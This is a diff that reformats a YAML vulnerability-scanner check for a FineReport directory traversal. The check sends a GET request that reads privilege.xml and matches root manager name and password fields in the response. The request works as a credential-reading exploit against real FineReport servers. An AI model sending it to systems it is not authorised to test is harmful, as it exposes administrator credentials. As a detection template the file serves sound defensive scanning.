@@ -1,13 +1,15 @@
-expression: r0()
 id: finereport-directory-traversal
+
 info:
-  author: l1nk3r(http://www.lmxspace.com/)
-  name: Finereport Directory Traversal
-  severity: high
+    name: Finereport Directory Traversal
+    author: l1nk3r(http://www.lmxspace.com/)
+    severity: high
+
 rules:
-  r0:
-    expression: response.status == 200 && response.body.bcontains(b"<rootManagerName>")
-      && response.body.bcontains(b"<rootManagerPassword>")
-    request:
-      method: GET
-      path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+    r0:
+        request:
+            method: GET
+            path: /report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
+        expression: response.status == 200 && response.body.bcontains(b"<rootManagerName>") && response.body.bcontains(b"<rootManagerPassword>")
+expression: r0()
+
